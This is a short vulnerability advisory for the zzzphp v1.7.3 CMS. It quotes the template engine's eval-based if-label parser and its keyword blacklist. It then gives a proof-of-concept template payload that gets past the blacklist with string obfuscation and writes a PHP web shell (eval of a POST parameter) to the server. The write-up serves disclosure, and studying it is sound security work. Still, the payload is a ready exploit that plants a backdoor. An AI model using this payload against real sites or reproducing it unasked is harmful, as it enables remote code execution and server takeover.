# General
    Vulnerability Name: zzzphp v1.7.3 code execution (latest version)
    Product Homepage: http://www.zzzcms.com
    Software Link: http://115.29.55.18/zzzphp.zip
    Version: v1.7.3

# Vulnerability Overview
Affected code is located at `inc/zzz_template.php:2335`, function `parserIfLabel`.
```php
function parserIfLabel( $zcontent ) {
	$pattern = '/\{if:([\s\S]+?)}([\s\S]*?){end\s+if}/';
	if ( preg_match_all( $pattern, $zcontent, $matches ) ) {
		$count = count( $matches[ 0 ] );
		for ( $i = 0; $i < $count; $i++ ) {
			$flag = '';
			$out_html = '';
			$ifstr = $matches[ 1 ][ $i ];
			$ifstr=danger_key($ifstr);
			$ifstr = str_replace( '=', '==', $ifstr );	
			$ifstr = str_replace( '<>', '!=', $ifstr );
			$ifstr = str_replace( 'or', '||', $ifstr );
			$ifstr = str_replace( 'and', '&&', $ifstr );
			$ifstr = str_replace( 'mod', '%', $ifstr );						
			@eval( 'if(' . $ifstr . '){$flag="if";}else{$flag="else";}' );
			if ( preg_match( '/([\s\S]*)?\{else\}([\s\S]*)?/', $matches[ 2 ][ $i ], $matches2 ) ) { // 判断是否存在else			
				switch ( $flag ) {
					case 'if': // 条件为真
						if ( isset( $matches2[ 1 ] ) ) {
							$out_html .= $matches2[ 1 ];
						}
						break;
					case 'else': // 条件为假
						if ( isset( $matches2[ 2 ] ) ) {
							$out_html .= $matches2[ 2 ];
						}
						break;
				}
			} elseif ( $flag == 'if' ) {
				$out_html .= $matches[ 2 ][ $i ];
			}
			// 无限极嵌套解析
			$pattern2 = '/\{if([0-9]):/';
			if ( preg_match( $pattern2, $out_html, $matches3 ) ) {
				$out_html = str_replace( '{if' . $matches3[ 1 ], '{if', $out_html );
				$out_html = str_replace( '{else' . $matches3[ 1 ] . '}', '{else}', $out_html );
				$out_html = str_replace( '{end if' . $matches3[ 1 ] . '}', '{end if}', $out_html );
				$out_html = $this->parserIfLabel( $out_html );
			}
			// 执行替换
			$zcontent = str_replace( $matches[ 0 ][ $i ], $out_html, $zcontent );
		}
	}
	return $zcontent;
}
```
This function is mainly to parse the if statement in the template file. Besides execute blacklist substitution for `$ifstr`, which is added in v1.7.2. The replacement function is as follows:

```php
function danger_key($s) {
	$danger=array('php','preg','server','chr','decode','html','md5','post','get','file','dir','cookie','session','sql','del','encrypt','$','system','exec','shell','open','ini_','chroot','eval','passthru','include','require','assert','union','_','?');
	$s = str_ireplace($danger,"*",$s);
	$key=array('php','preg','decode','post','get','cookie','session','$','exec','eval','replace');
   foreach ($key as $val){
	   if(strpos($s,$val) !==false){
		error('很抱歉，您模板中包含危险字符,【'.$val.'】,Sorry your template contains dangerous characters');
		}
   }
	return $s;
}
```

## POC: (Bypass the patch from v1.7.2)

```php
{if:1=1);file_put_contents(strtr("1.p*p", "*", "h"),strtr('<?*h* ', "*", "p").strtr('ev*l(', "*", "a").hex2bin('24').strtr('_P*ST[1]);', "*", "O"));//} {end if}```

![](https://ae01.alicdn.com/kf/H8d8d07e843e5475285a61cb1c9f741f6P.jpg)

![](https://ae01.alicdn.com/kf/H165b250539834c9790a826b7fef9ab4d0.jpg)

![](https://ae01.alicdn.com/kf/H56cdd2dbe2f04d1691fba2caab9341dbt.jpg)

![](https://ae01.alicdn.com/kf/He1a5504ebce54f40b1370844211a6bfd7.jpg)
